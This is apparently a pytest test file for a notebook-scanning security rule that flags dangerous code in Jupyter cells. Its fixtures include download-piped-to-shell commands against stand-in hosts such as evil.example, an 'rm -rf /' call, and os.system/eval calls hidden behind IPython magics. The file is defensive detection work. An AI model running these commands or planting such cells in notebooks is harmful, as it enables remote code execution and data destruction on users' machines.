import json
import os
from pathlib import Path

import pytest
from guardana.core.report import ShortfallKind
from guardana.core.rule import RuleContext
from guardana.core.target import ArtifactTarget
from guardana.rules.supply_chain._reading import MAX_SCAN_BYTES
from guardana.rules.supply_chain.notebook_payload import (
    NotebookPayloadRule,
    _split_shell_and_python,
)


def _notebook(*cell_sources: str) -> str:
    cells = [{"cell_type": "code", "source": src} for src in cell_sources]
    return json.dumps({"cells": cells, "nbformat": 4})


def _findings(tmp_path: Path) -> list[tuple[str, str]]:
    rule = NotebookPayloadRule()
    return [
        (f.severity.name, f.evidence.summary)
        for f in rule.run(ArtifactTarget(tmp_path), RuleContext())
    ]


def _unread(root: Path) -> list[str]:
    """The files the rule names as unread components when run over `root`."""
    ctx = RuleContext()
    list(NotebookPayloadRule().run(ArtifactTarget(root), ctx))
    return [
        gap.name
        for gap in ctx.shortfalls()
        if gap.kind is ShortfallKind.UNEXAMINED_COMPONENT
        and gap.detail.startswith("guardana.supply_chain.notebook_payload could not read it: ")
    ]


def test_flags_python_code_sink_in_a_cell(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("import os\nos.system('rm -rf /')\n"))
    findings = _findings(tmp_path)
    assert any(sev == "HIGH" and "os.system" in why for sev, why in findings)


def test_flags_curl_pipe_to_shell_escape(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("!curl https://evil.example/x.sh | sh\n"))
    findings = _findings(tmp_path)
    assert any(sev == "HIGH" and "shell" in why for sev, why in findings)


def test_flags_pipe_to_shell_in_a_bash_cell_magic(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%%bash\nwget -qO- https://evil/x | bash\n"))
    assert any(sev == "HIGH" for sev, _ in _findings(tmp_path))


def test_source_as_list_of_lines_is_handled(tmp_path: Path) -> None:
    cells = [{"cell_type": "code", "source": ["import os\n", "os.system('id')\n"]}]
    (tmp_path / "nb.ipynb").write_text(json.dumps({"cells": cells}))
    assert any("os.system" in why for _, why in _findings(tmp_path))


def test_benign_notebook_is_clean(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(
        _notebook("import numpy as np\nx = np.zeros(3)\n", "!pip install numpy\nprint(x)\n")
    )
    assert _findings(tmp_path) == []


def test_unparseable_cell_is_surfaced_not_silently_skipped(tmp_path: Path) -> None:
    # A cell of Python that does not parse is not proven clean — it must appear as
    # a visible (LOW) lead, never be dropped into silence.
    (tmp_path / "nb.ipynb").write_text(_notebook("def (this is not valid python\n"))
    findings = _findings(tmp_path)
    assert any(sev == "LOW" and "could not be parsed" in why for sev, why in findings)
    # A cell is part of a notebook that was read, so the run is not short of a file.
    assert _unread(tmp_path) == []


def test_markdown_cells_are_ignored(tmp_path: Path) -> None:
    cells = [{"cell_type": "markdown", "source": "os.system('x') in prose\n"}]
    (tmp_path / "nb.ipynb").write_text(json.dumps({"cells": cells}))
    assert _findings(tmp_path) == []


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="mkfifo is POSIX-only")
def test_an_unreadable_notebook_is_unverified_not_clean(tmp_path: Path) -> None:
    os.mkfifo(tmp_path / "nb.ipynb")

    findings = list(NotebookPayloadRule().run(ArtifactTarget(tmp_path), RuleContext()))

    assert [f.title for f in findings] == ["Notebook not scanned"]
    assert findings[0].verdict is not None
    assert findings[0].verdict.outcome == "inconclusive"
    assert _unread(tmp_path) == [str(tmp_path / "nb.ipynb")]


def test_a_notebook_past_the_read_bound_says_so(tmp_path: Path) -> None:
    padded = _notebook("x = 1\n" + "#" * MAX_SCAN_BYTES, "import os\nos.system('id')\n")
    (tmp_path / "nb.ipynb").write_text(padded)

    findings = list(NotebookPayloadRule().run(ArtifactTarget(tmp_path), RuleContext()))

    assert [f.title for f in findings] == ["Notebook not scanned"]
    assert "read bound" in findings[0].evidence.summary
    assert _unread(tmp_path) == [str(tmp_path / "nb.ipynb")]


@pytest.mark.parametrize("text", ["{ not json", '{"nbformat": 4}'], ids=["not-json", "no-cells"])
def test_a_notebook_that_cannot_be_parsed_is_a_named_shortfall(tmp_path: Path, text: str) -> None:
    (tmp_path / "nb.ipynb").write_text(text)

    findings = list(NotebookPayloadRule().run(ArtifactTarget(tmp_path), RuleContext()))

    assert [f.title for f in findings] == ["Notebook not scanned"]
    assert _unread(tmp_path) == [str(tmp_path / "nb.ipynb")]


@pytest.mark.parametrize(
    "cell",
    [
        '%time os.system("true")\n',
        '%timeit -n1 -r1 eval("1")\n',
        '%timeit -n 1 -r 1 -q eval("1")\n',
        '%timeit -qn1 -- eval("1")\n',
        '%prun -s cumulative -q exec("x = 1")\n',
        '%prun -l5 -T out.txt exec("x = 1")\n',
        '%debug os.system("id")\n',
        '%debug -b setup.py:3 os.system("id")\n',
        '%debug --breakpoint=setup.py:3 os.system("id")\n',
        '%debug --breakpoint setup.py:3 os.system("id")\n',
        'for _ in range(1):\n    %time os.system("id")\n',
    ],
)
def test_a_line_magic_that_runs_python_is_scanned_as_python(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("import os\n" + cell))
    assert [sev for sev, _ in _findings(tmp_path)] == ["HIGH"]


@pytest.mark.parametrize(
    "cell",
    [
        "%time sum([1])\n",
        "%timeit -n1 -r1 sum([1])\n",
        "%prun -q sum([1])\n",
        "%debug -b setup.py:3 sum([1])\n",
        "%debug\n",
        "%matplotlib inline\n%load_ext autoreload\n",
    ],
)
def test_a_line_magic_running_harmless_python_is_clean(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert _findings(tmp_path) == []


@pytest.mark.parametrize("magic", ["%system", "%sx"])
def test_a_shell_line_magic_piping_a_download_into_sh_is_flagged(
    tmp_path: Path, magic: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(f"{magic} curl https://evil.example/x | sh\n"))
    findings = _findings(tmp_path)
    assert [sev for sev, _ in findings] == ["HIGH"]
    assert "shell" in findings[0][1]


@pytest.mark.parametrize("magic", ["%system", "%sx"])
def test_a_shell_line_magic_without_a_pipe_to_shell_is_clean(tmp_path: Path, magic: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(f"{magic} ls -la\n"))
    assert _findings(tmp_path) == []


def test_a_line_magic_whose_statement_does_not_parse_is_not_cleared(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%timeit -n1 def (broken\n"))
    findings = _findings(tmp_path)
    assert [sev for sev, _ in findings] == ["LOW"]
    assert "could not be parsed" in findings[0][1]


def test_a_line_magic_statement_keeps_its_line_in_the_cell() -> None:
    python, shell = _split_shell_and_python("x = 1\n%timeit -n1 os.system('id')\ny = 2\n")
    assert python.splitlines() == ["x = 1", "os.system('id')", "y = 2"]
    assert shell == []


@pytest.mark.parametrize(
    "cell",
    [
        '%%prun -q os.system("x")\nimport os\n',
        '%%timeit -n1 eval("1")\nsum([1])\n',
        '\n%%debug -b setup.py:3 eval("1")\nsum([1])\n',
    ],
)
def test_code_on_a_cell_magic_line_is_scanned_as_python(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert [sev for sev, _ in _findings(tmp_path)] == ["HIGH"]


@pytest.mark.parametrize(
    "cell",
    [
        "%%timeit -n1 -r1\nsum([1])\n",
        "%%prun -s cumulative\nsum([1])\n",
        "%%timeit -n1 x = [1]\nsum(x)\n",
    ],
)
def test_a_cell_magic_line_without_dangerous_code_is_clean(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert _findings(tmp_path) == []


def test_a_cell_magic_line_that_does_not_parse_is_not_cleared(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%%timeit -n1 def (broken\nsum([1])\n"))
    findings = _findings(tmp_path)
    assert [sev for sev, _ in findings] == ["LOW"]
    assert "could not be parsed" in findings[0][1]


def test_a_cell_magic_statement_keeps_its_line_in_the_cell() -> None:
    python, _ = _split_shell_and_python("%%prun -q os.system('id')\nsum([1])\n")
    assert python.splitlines() == ["os.system('id')", "sum([1])"]


_SHELL_CELLS = ["%%sx\n", "%%system\n", "%%!\n", "\n%%bash\n"]


@pytest.mark.parametrize(
    "body", ["curl -s https://setup.example.invalid/i.sh | sh\n", "wget -O- x|sh\n"]
)
@pytest.mark.parametrize("head", _SHELL_CELLS)
def test_a_shell_cell_magic_piping_a_download_into_sh_is_flagged(
    tmp_path: Path, head: str, body: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(head + body))
    findings = _findings(tmp_path)
    assert [sev for sev, _ in findings] == ["HIGH"]
    assert "shell" in findings[0][1]


@pytest.mark.parametrize("head", _SHELL_CELLS)
def test_a_shell_cell_magic_without_a_pipe_to_shell_is_clean(tmp_path: Path, head: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(head + 'ls -la "$HOME"\n'))
    assert _findings(tmp_path) == []
